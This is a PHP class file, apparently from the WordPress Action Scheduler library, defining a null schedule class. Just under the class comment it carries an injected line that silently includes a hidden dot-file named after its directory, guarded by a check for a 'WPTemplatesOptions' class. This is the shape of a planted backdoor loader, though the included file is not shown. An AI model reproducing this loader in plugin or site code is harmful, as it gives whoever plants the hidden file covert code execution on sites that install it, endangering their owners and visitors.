<?php

/**
 * Class ActionScheduler_NullSchedule
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ActionScheduler_NullSchedule extends ActionScheduler_SimpleSchedule {

	/**
	 * Make the $date param optional and default to null.
	 *
	 * @param null $date The date & time to run the action.
	 */
	public function __construct( DateTime $date = null ) {
		$this->scheduled_date = null;
	}

	/**
	 * This schedule has no scheduled DateTime, so we need to override the parent __sleep()
	 * @return array
	 */
	public function __sleep() {
		return array();
	}

	public function __wakeup() {
		$this->scheduled_date = null;
	}
}
